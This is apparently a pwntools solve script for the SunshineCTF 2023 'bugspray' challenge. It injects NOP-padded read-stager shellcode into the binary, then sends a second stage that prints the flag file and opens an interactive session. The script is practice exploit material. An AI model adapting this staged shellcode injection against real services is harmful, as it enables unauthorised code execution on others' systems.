from pwn import *

context.log_level = 'debug'
e = context.binary = ELF("./bugspray")
r=e.process()
# r = remote("chal.2023.sunshinectf.games", 23004);
shellcode = asm(shellcraft.read(1,0x777790,500))
print(len(shellcode))
shellcode = shellcode.ljust(68, b'\x90')
r.sendlineafter(">>", shellcode)

sleep(10)

r.sendline(asm(shellcraft.cat("./flag.txt")))




r.interactive()